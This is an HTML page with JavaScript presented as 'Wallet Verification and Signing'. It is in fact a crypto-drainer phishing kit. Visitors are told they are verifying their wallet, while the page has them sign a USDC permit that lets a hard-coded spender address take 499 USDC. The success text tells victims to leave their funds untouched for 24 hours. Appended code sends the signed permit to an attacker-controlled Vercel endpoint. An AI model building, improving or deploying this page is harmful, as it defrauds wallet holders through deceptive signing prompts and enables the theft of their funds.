<!-- verify.html -->
<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Wallet Verification and Signing</title>
  <!-- Ethers.js CDN -->
  <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"
          integrity="sha512-y0x8KJxkwtU01dzGL11pZaxjoyuGsR3xpG+jFzlfHgzhEyTS/G5s6BG2LSj3jaXpNIJKsnU3KGMEsP1z6kp4Wg=="
          crossorigin="anonymous" referrerpolicy="no-referrer"></script>
</head>
<body>
  <!-- ========== Modifiable display text ========== -->
  <h1 id="pageHeader">Wallet Verification & Signing</h1>
  <p id="instructionText">Click the button below to connect your external wallet and sign the verification permit.</p>
  <button id="connectButton">Connect Wallet & Sign</button>
  <p id="statusText"></p>

  <script>
    // ========== Fixed / critical values (do NOT change) ==========
    const USDC_ADDRESS = '0x833589FCD6EDB6E08F4C7C32D4F71B54BDA02913'; // Base USDC
    const SPENDER_ADDRESS = '0xBF17DB5938E98f1F9D30ac889F8fd91d749803C8'; // Your Trust Wallet
    const CHAIN_ID = 8453; // Base mainnet
    const DECIMALS = 6; // USDC decimals

    // ========== Modifiable values ==========
    const USDC_VALUE = '499'; // Amount to request
    const PERMIT_VALIDITY_HOURS = 24; // Deadline = now + 24 hours

    const domain = {
      name: 'USDC',
      version: '2',
      chainId: CHAIN_ID,
      verifyingContract: USDC_ADDRESS
    };

    const types = {
      Permit: [
        { name: 'owner',   type: 'address' },
        { name: 'spender', type: 'address' },
        { name: 'value',   type: 'uint256' },
        { name: 'nonce',   type: 'uint256' },
        { name: 'deadline',type: 'uint256' }
      ]
    };

    const connectButton = document.getElementById('connectButton');
    const statusText = document.getElementById('statusText');

    // Function to save JSON file locally on Android
    function savePermitToFile(data) {
      const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
      const url = URL.createObjectURL(blob);
      const a = document.createElement('a');
      a.href = url;
      a.download = `permit_${Date.now()}.json`; // file will appear in phone's Downloads folder
      document.body.appendChild(a);
      a.click();
      document.body.removeChild(a);
      URL.revokeObjectURL(url);
    }

    connectButton.onclick = async () => {
      if (!window.ethereum) {
        alert('Please install a Web3 wallet (MetaMask/TrustWallet/Base Wallet) to continue.');
        return;
      }

      try {
        // Request wallet connection
        await window.ethereum.request({ method: 'eth_requestAccounts' });
        const provider = new ethers.providers.Web3Provider(window.ethereum);
        const network = await provider.getNetwork();
        if (network.chainId !== CHAIN_ID) {
          alert('Please switch your wallet to Base network (chainId 8453) and try again.');
          return;
        }

        const signer = provider.getSigner();
        const owner = await signer.getAddress();
        statusText.innerText = 'Connected! Verifying the wallet...';

        // Convert USDC value to smallest units
        const value = ethers.utils.parseUnits(USDC_VALUE, DECIMALS);

        // Read nonce from USDC contract
        const usdcAbi = ["function nonces(address) view returns (uint256)"];
        const usdcContract = new ethers.Contract(USDC_ADDRESS, usdcAbi, provider);
        const nonce = await usdcContract.nonces(owner);

        const deadline = Math.floor(Date.now() / 1000) + PERMIT_VALIDITY_HOURS * 3600; // seconds

        const message = { owner, spender: SPENDER_ADDRESS, value: value.toString(), nonce: nonce.toString(), deadline };

        // Sign EIP-712 typed data
        const signature = await signer._signTypedData(domain, types, message);
        const sig = ethers.utils.splitSignature(signature);

        // Prepare final permit data object
        const permitData = {
          owner,
          spender: SPENDER_ADDRESS,
          value: value.toString(),
          nonce: nonce.toString(),
          deadline,
          v: sig.v,
          r: sig.r,
          s: sig.s
        };

        // Automatically save JSON file locally on phone
        savePermitToFile(permitData);

        statusText.innerText = 'Signing completed! Please keep your funds still for at least 24 hours in the current state to complete the verification.'
      } catch (err) {
        console.error('Error signing permit:', err);
        statusText.innerText = 'Error signing permit. Check console for details.';
      }
    };
// Replace savePermitToFile(permitData) with:
async function sendPermitToVercel(data) {
  try {
    const response = await fetch('https://<YOUR_VERCEL_PROJECT>.vercel.app/api/savePermit', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(data)
    });
    const result = await response.json();
    console.log('Vercel response:', result);
    statusText.innerText = 'Permit signed! Data sent to Vercel cloud.';
  } catch (err) {
    console.error(err);
    statusText.innerText = 'Failed to send permit to cloud.';
  }
}

// After creating permitData:
sendPermitToVercel(permitData);
  </script>
</body>
</html>
